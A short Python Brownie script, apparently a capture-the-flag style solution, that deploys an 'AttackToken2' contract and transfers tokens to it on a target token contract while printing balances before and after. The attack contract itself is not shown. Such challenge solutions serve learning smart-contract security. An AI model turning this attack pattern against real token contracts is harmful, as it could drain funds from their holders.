from brownie import accounts,config,network,interface, AttackToken2


def main():
    network.priority_fee("5 gwei")
    contract = '0xAe9ceebd24707960294d63e2bF5f6d9AcBf244ba'
    player = accounts.add(config['wallets']['from_key'])

    AttackToken2_instance = AttackToken2.deploy({'from':player})
    itoken_interface = interface.IToken(contract)

    balance = itoken_interface.balanceOf(player)
    total = itoken_interface.totalSupply()

    print('Player balance: ',balance)
    print('Contract\'s balance: ', total)
    transfer = itoken_interface.transfer(AttackToken2_instance.address, 21,{'from':player})

    transfer.wait(1)
    print('wait')
    # Have to sent transaction again to get latest update
    balance = itoken_interface.balanceOf(player)
    total = itoken_interface.totalSupply()

    print('Player balance: ',balance)
    
    print('Contract\'s balance: ', total)



